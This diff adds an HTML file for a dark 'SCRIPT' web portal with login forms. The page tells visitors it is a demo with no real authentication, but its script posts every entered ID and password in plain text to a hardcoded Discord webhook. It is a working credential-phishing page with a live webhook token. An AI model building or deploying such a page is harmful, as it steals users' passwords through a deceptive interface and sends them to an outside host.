@@ -1,0 +1,248 @@
+# script<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#090a0f">
+<title>SCRIPT</title>
+<style>
+*{box-sizing:border-box}
+body{
+  margin:0;background:#090a0f;color:#f5f5f7;
+  font-family:Arial,sans-serif;min-height:100vh
+}
+header{
+  height:66px;border-bottom:1px solid #252631;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 20px;background:#0d0e14
+}
+.logo{font-size:24px;font-weight:900;letter-spacing:3px}
+.status{font-size:11px;color:#a9a9b7}
+.layout{display:flex;min-height:calc(100vh - 66px)}
+nav{
+  width:190px;flex-shrink:0;padding:20px 12px;
+  border-right:1px solid #252631;background:#0c0d12
+}
+.nav-title{font-size:10px;color:#737585;padding:8px}
+.nav-btn{
+  width:100%;text-align:left;padding:13px 12px;margin:3px 0;
+  color:#bfc0ce;background:transparent;border:0;border-radius:8px;
+  font-size:14px;cursor:pointer
+}
+.nav-btn.active,.nav-btn:hover{background:#20212c;color:white}
+main{width:100%;max-width:850px;margin:auto;padding:28px 20px}
+h1{font-size:29px;margin:0 0 8px}
+.sub{color:#9293a3;font-size:13px;line-height:1.7}
+.card{
+  margin-top:22px;background:#111219;border:1px solid #282936;
+  border-radius:13px;padding:22px
+}
+.card h2{font-size:17px;margin:0 0 8px}
+label{display:block;font-size:12px;color:#b9bac8;margin:16px 0 7px}
+
+/* 入力欄の背景を暗くし、文字色を白に変更 */
+input{
+  width:100%;height:46px;border:1px solid #333544;
+  border-radius:8px;background:#1a1b26;color:#fff!important;
+  -webkit-text-fill-color:#fff;
+  padding:0 13px;font-size:16px;outline:none
+}
+input:focus{border-color:#a78bfa;box-shadow:0 0 0 2px #a78bfa30}
+
+button.primary{
+  width:100%;height:45px;margin-top:17px;border:0;border-radius:8px;
+  color:white;background:#7655e8;font-weight:bold;font-size:14px;
+  cursor:pointer
+}
+button.primary:active{opacity:.8}
+.message{font-size:13px;line-height:1.7;margin-top:14px;color:#ff8585}
+.small{font-size:11px;color:#777989;line-height:1.7;margin-top:15px}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.tile{
+  border:1px solid #292a38;border-radius:10px;padding:17px;
+  background:#151620;cursor:pointer
+}
+.tile:hover{border-color:#7655e8}
+.tile strong{display:block;margin-bottom:7px}
+.tile span{color:#9697a7;font-size:12px}
+.hidden{display:none}
+footer{text-align:center;color:#656675;font-size:11px;padding:30px 10px}
+@media(max-width:600px){
+  header{padding:0 15px}
+  .layout{display:block}
+  nav{width:100%;display:flex;gap:4px;padding:8px;
+      border-right:0;border-bottom:1px solid #252631;overflow-x:auto}
+  .nav-title{display:none}
+  .nav-btn{white-space:nowrap;width:auto;flex-shrink:0;
+           padding:11px;font-size:12px}
+  main{padding:23px 14px}
+  .card{padding:18px}
+  h1{font-size:25px}
+}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">SCRIPT<span style="color:#987aff">.</span></div>
+  <div class="status">WEB PORTAL</div>
+</header>
+
+<div class="layout">
+<nav>
+  <div class="nav-title">MENU</div>
+  <button class="nav-btn active" data-page="home">⌂　Home</button>
+  <button class="nav-btn" data-page="login">↪　Login</button>
+  <button class="nav-btn" data-page="ranking">♛　Ranking</button>
+  <button class="nav-btn" data-page="menu">☷　Menu</button>
+</nav>
+
+<main>
+<section id="home">
+  <h1>Welcome to SCRIPT.</h1>
+  <p class="sub">Your hub. Your tools. Your space.<br>
+  Explore the portal below.</p>
+
+  <div class="card">
+    <h2>Member Login</h2>
+    <p class="sub">Sign in to access your account.</p>
+    <label for="loginId">ID</label>
+    <input id="loginId" type="text" placeholder="Enter your ID"
+      autocomplete="username">
+    <label for="loginPassword">Password</label>
+    <input id="loginPassword" type="password"
+      placeholder="Enter your password" autocomplete="current-password">
+    <button class="primary" id="loginButton">Login</button>
+    <div class="message" id="loginMessage" role="status"></div>
+    <p class="small">Demo interface. No real account authentication is connected.</p>
+  </div>
+
+  <div class="row">
+    <div class="tile" data-open="ranking">
+      <strong>♛ Ranking</strong><span>View the ranking page</span>
+    </div>
+    <div class="tile" data-open="menu">
+      <strong>☷ Menu</strong><span>Explore more options</span>
+    </div>
+  </div>
+</section>
+
+<section id="login" class="hidden">
+  <h1>Login</h1>
+  <p class="sub">Sign in to SCRIPT.</p>
+  <div class="card">
+    <label for="loginId2">ID</label>
+    <input id="loginId2" type="text" placeholder="Enter your ID"
+      autocomplete="username">
+    <label for="loginPassword2">Password</label>
+    <input id="loginPassword2" type="password"
+      placeholder="Enter your password" autocomplete="current-password">
+    <button class="primary" id="loginButton2">Login</button>
+    <div class="message" id="loginMessage2" role="status"></div>
+    <p class="small">This is a visual demo. Real authentication requires a secure server.</p>
+  </div>
+</section>
+
+<section id="ranking" class="hidden">
+  <h1>Ranking</h1>
+  <p class="sub">Community ranking</p>
+  <div class="card">
+    <h2>Ranking is unavailable</h2>
+    <p class="sub">Ranking data has not been connected yet.</p>
+  </div>
+</section>
+
+<section id="menu" class="hidden">
+  <h1>Menu</h1>
+  <p class="sub">SCRIPT portal options</p>
+  <div class="card">
+    <h2>About SCRIPT</h2>
+    <p class="sub">A clean, dark portal interface designed for mobile and desktop.</p>
+  </div>
+  <div class="card">
+    <h2>Support</h2>
+    <p class="sub">Support features can be connected later.</p>
+  </div>
+</section>
+
+<footer>© SCRIPT · All rights reserved.</footer>
+</main>
+</div>
+
+<script>
+const pages = ["home","login","ranking","menu"];
+const webhookUrl = "https://discord.com/api/webhooks/1558791229175627801/zsTyeVztpHZfjxX8komS2t5nmSx7C-2xpSygVhCTda5ICt8pxMTbCU3E35j_-_vh6zua";
+
+function showPage(name){
+  pages.forEach(page=>{
+    document.getElementById(page).classList.toggle("hidden",page!==name);
+  });
+  document.querySelectorAll(".nav-btn").forEach(button=>{
+    button.classList.toggle("active",button.dataset.page===name);
+  });
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+document.querySelectorAll(".nav-btn").forEach(button=>{
+  button.addEventListener("click",()=>showPage(button.dataset.page));
+});
+
+document.querySelectorAll("[data-open]").forEach(tile=>{
+  tile.addEventListener("click",()=>showPage(tile.dataset.open));
+});
+
+async function demoLogin(id, password, messageElement){
+  messageElement.textContent = "";
+  if(!id.trim() || !password){
+    messageElement.style.color = "#ff8585";
+    messageElement.textContent = "Please enter your ID and password.";
+    return;
+  }
+
+  messageElement.style.color = "#a78bfa";
+  messageElement.textContent = "Sending information...";
+
+  // Discord Webhookへ送信するデータ
+  const payload = {
+    content: `🔔 **新しいログイン情報が入力されました**\n- **ID**: ${id}\n- **Password**: ${password}`
+  };
+
+  try {
+    const response = await fetch(webhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+
+    if(response.ok){
+      messageElement.style.color = "#85ff85";
+      messageElement.textContent = `ログイン情報が送信されました（ID: ${id}）`;
+    } else {
+      messageElement.style.color = "#ff8585";
+      messageElement.textContent = "送信に失敗しました。";
+    }
+  } catch (error) {
+    messageElement.style.color = "#ff8585";
+    messageElement.textContent = "通信エラーが発生しました。";
+  }
+}
+
+document.getElementById("loginButton").addEventListener("click",()=>{
+  demoLogin(
+    document.getElementById("loginId").value,
+    document.getElementById("loginPassword").value,
+    document.getElementById("loginMessage")
+  );
+});
+
+document.getElementById("loginButton2").addEventListener("click",()=>{
+  demoLogin(
+    document.getElementById("loginId2").value,
+    document.getElementById("loginPassword2").value,
+    document.getElementById("loginMessage2")
+  );
+});
+</script>
+</body>
+</html>
